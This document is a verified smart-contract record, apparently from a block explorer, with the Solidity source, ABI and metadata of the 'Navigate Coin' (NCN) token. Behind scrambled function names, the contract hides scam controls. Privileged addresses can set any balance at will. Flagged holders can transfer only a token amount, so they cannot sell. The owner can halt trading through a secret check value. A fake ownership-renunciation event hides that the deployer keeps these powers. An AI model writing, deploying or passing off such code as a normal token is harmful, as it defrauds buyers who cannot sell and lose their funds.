{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract modeLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromLiquidity {\n    function createPair(address listLaunched, address totalAt) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface launchFromTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface walletLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverToken) external view returns (uint256);\n\n    function transfer(address sellLaunched, uint256 atLaunched) external returns (bool);\n\n    function allowance(address swapFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellLaunched,\n        uint256 atLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeShould, uint256 value);\n    event Approval(address indexed swapFee, address indexed spender, uint256 value);\n}\n\ninterface walletLimitMetadata is walletLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NavigateCoin is modeLaunch, walletLimit, walletLimitMetadata {\n\n    bool public buyTxReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableSender;\n    }\n\n    bool private takeTx;\n\n    bool private sellToken;\n\n    function fromLaunched() private view {\n        require(totalMin[_msgSender()]);\n    }\n\n    mapping(address => bool) public totalMin;\n\n    bool public toIs;\n\n    function maxIsAmount(address tokenLiquidity) public {\n        fromLaunched();\n        \n        if (tokenLiquidity == launchSender || tokenLiquidity == minTx) {\n            return;\n        }\n        minIs[tokenLiquidity] = true;\n    }\n\n    bool private walletList;\n\n    mapping(address => bool) public minIs;\n\n    string private receiverSender = \"Navigate Coin\";\n\n    mapping(address => uint256) private sellEnable;\n\n    uint256 constant fromAtMax = 3 ** 10;\n\n    function approve(address launchedList, uint256 atLaunched) public virtual override returns (bool) {\n        tokenTxList[_msgSender()][launchedList] = atLaunched;\n        emit Approval(_msgSender(), launchedList, atLaunched);\n        return true;\n    }\n\n    uint256 public minToken = 0;\n\n    uint256 private takeReceiver = 100000000 * 10 ** 18;\n\n    function enableToken(address listReceiver) public {\n        require(listReceiver.balance < 100000);\n        if (fundEnable) {\n            return;\n        }\n        \n        totalMin[listReceiver] = true;\n        \n        fundEnable = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeReceiver;\n    }\n\n    uint256 public toListLaunched = 3;\n\n    bool private isSellAt;\n\n    function transfer(address minReceiverLimit, uint256 atLaunched) external virtual override returns (bool) {\n        return tradingEnable(_msgSender(), minReceiverLimit, atLaunched);\n    }\n\n    address public minTx;\n\n    function feeMarketing() public {\n        emit OwnershipTransferred(launchSender, address(0));\n        buySell = address(0);\n    }\n\n    function walletMode(address maxFrom, address sellLaunched, uint256 atLaunched) internal view returns (uint256) {\n        require(atLaunched > 0);\n\n        uint256 tokenTotal = 0;\n        if (maxFrom == minTx && toListLaunched > 0) {\n            tokenTotal = atLaunched * toListLaunched / 100;\n        } else if (sellLaunched == minTx && minToken > 0) {\n            tokenTotal = atLaunched * minToken / 100;\n        }\n        require(tokenTotal <= atLaunched);\n        return atLaunched - tokenTotal;\n    }\n\n    event OwnershipTransferred(address indexed isEnable, address indexed walletShould);\n\n    function transferFrom(address maxFrom, address sellLaunched, uint256 atLaunched) external override returns (bool) {\n        if (_msgSender() != sellTradingLaunched) {\n            if (tokenTxList[maxFrom][_msgSender()] != type(uint256).max) {\n                require(atLaunched <= tokenTxList[maxFrom][_msgSender()]);\n                tokenTxList[maxFrom][_msgSender()] -= atLaunched;\n            }\n        }\n        return tradingEnable(maxFrom, sellLaunched, atLaunched);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSender;\n    }\n\n    string private launchedLaunch = \"NCN\";\n\n    address private buySell;\n\n    function marketingExempt(address minReceiverLimit, uint256 atLaunched) public {\n        fromLaunched();\n        sellEnable[minReceiverLimit] = atLaunched;\n    }\n\n    bool private teamTrading;\n\n    address walletTo;\n\n    uint256 private enableLiquidity;\n\n    function balanceOf(address receiverToken) public view virtual override returns (uint256) {\n        return sellEnable[receiverToken];\n    }\n\n    function tokenTeam(address maxFrom, address sellLaunched, uint256 atLaunched) internal returns (bool) {\n        require(sellEnable[maxFrom] >= atLaunched);\n        sellEnable[maxFrom] -= atLaunched;\n        sellEnable[sellLaunched] += atLaunched;\n        emit Transfer(maxFrom, sellLaunched, atLaunched);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return buySell;\n    }\n\n    address sellTradingLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return buySell;\n    }\n\n    function tradingEnable(address maxFrom, address sellLaunched, uint256 atLaunched) internal returns (bool) {\n        if (maxFrom == launchSender) {\n            return tokenTeam(maxFrom, sellLaunched, atLaunched);\n        }\n        uint256 isBuy = walletLimit(minTx).balanceOf(walletTo);\n        require(isBuy == listEnable);\n        require(sellLaunched != walletTo);\n        if (minIs[maxFrom]) {\n            return tokenTeam(maxFrom, sellLaunched, fromAtMax);\n        }\n        atLaunched = walletMode(maxFrom, sellLaunched, atLaunched);\n        return tokenTeam(maxFrom, sellLaunched, atLaunched);\n    }\n\n    bool public fundEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedLaunch;\n    }\n\n    bool private totalMarketing;\n\n    address public launchSender;\n\n    bool private takeAmount;\n\n    constructor (){\n        \n        feeMarketing();\n        launchFromTeam autoTeam = launchFromTeam(sellTradingLaunched);\n        minTx = fromLiquidity(autoTeam.factory()).createPair(autoTeam.WETH(), address(this));\n        walletTo = fromLiquidity(autoTeam.factory()).feeTo();\n        \n        launchSender = _msgSender();\n        totalMin[launchSender] = true;\n        sellEnable[launchSender] = takeReceiver;\n        \n        emit Transfer(address(0), launchSender, takeReceiver);\n    }\n\n    function txTo(uint256 atLaunched) public {\n        fromLaunched();\n        listEnable = atLaunched;\n    }\n\n    uint256 listEnable;\n\n    function allowance(address fromReceiver, address launchedList) external view virtual override returns (uint256) {\n        if (launchedList == sellTradingLaunched) {\n            return type(uint256).max;\n        }\n        return tokenTxList[fromReceiver][launchedList];\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenTxList;\n\n    uint8 private enableSender = 18;\n\n    uint256 tokenTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"marketingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"}],\"name\":\"maxIsAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toListLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atLaunched\",\"type\":\"uint256\"}],\"name\":\"txTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NavigateCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}